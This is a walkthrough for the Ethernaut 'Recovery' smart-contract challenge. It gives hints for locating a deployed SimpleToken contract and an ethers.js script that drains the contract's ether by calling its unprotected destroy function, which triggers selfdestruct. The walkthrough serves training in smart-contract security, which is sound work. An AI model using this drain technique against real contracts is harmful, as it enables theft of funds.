# 17 - Recovery

### Hints

<details>

<summary>Hint One</summary>

After generating the level instance, take a look at the instance address in a block explorer such as Etherscan. This is the `Recovery` contract. Are there any interesting internal transactions?

</details>

<details>

<summary>Hint Two</summary>

You can look at the “Contract Creation” internal transaction on Etherscan to locate the address of the new `SimpleToken` instance deployed by the level. Now your challenge is to drain this contract of ether.

</details>

<details>

<summary>Hint Three</summary>

The `SimpleToken` contract contains a strange global function you haven’t seen in other challenges.

</details>

### Scripted Solution

```javascript
const ethers = require('ethers')
const fs = require('fs')
require('dotenv').config({ path: './.env' })

/**
 * Initialize Ethers objects needed to interact with the blockchain and
 * contract.
 */
async function setup(contractName) {
  // Create provider - a read-only abstraction to access blockchain data
  const provider = new ethers.providers.InfuraProvider(process.env.NETWORK)
  // Create player wallet
  const playerWallet = new ethers.Wallet(process.env.PRIVATE_KEY)
  // Create player wallet signer - an abstraction of an Ethereum account
  const playerWalletSigner = await playerWallet.connect(provider)
  // Create contract instance - an abstraction of the deployed contract code
  const contractAbi = fs.readFileSync(`./${contractName}.abi`, 'utf8')
  const contract = new ethers.Contract(
    process.env.CONTRACT_ADDRESS,
    contractAbi,
    playerWalletSigner
  )

  return {
    provider,
    playerAddress: process.env.PLAYER_ADDRESS,
    playerWallet,
    playerWalletSigner,
    contract
  }
}

/**
 * Run contract exploit.
 */
async function main() {
  // Get Ethers objects needed to interact with the blockchain and contract
  const { playerAddress, contract: simpleTokenContract } = await setup(
    'SimpleToken'
  )

  // Get token name at contract address
  const tokenName = await simpleTokenContract.name()
  console.log(`Contract's token name: ${tokenName}.`)

  // Call `selfdestruct` on contract via `destroy` function, sending ether to player account
  console.log('Self destructing contract...')
  const selfDestruct = await simpleTokenContract.destroy(playerAddress)
  await selfDestruct.wait(1)
}

main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error(error)
    process.exit(1)
  })
```
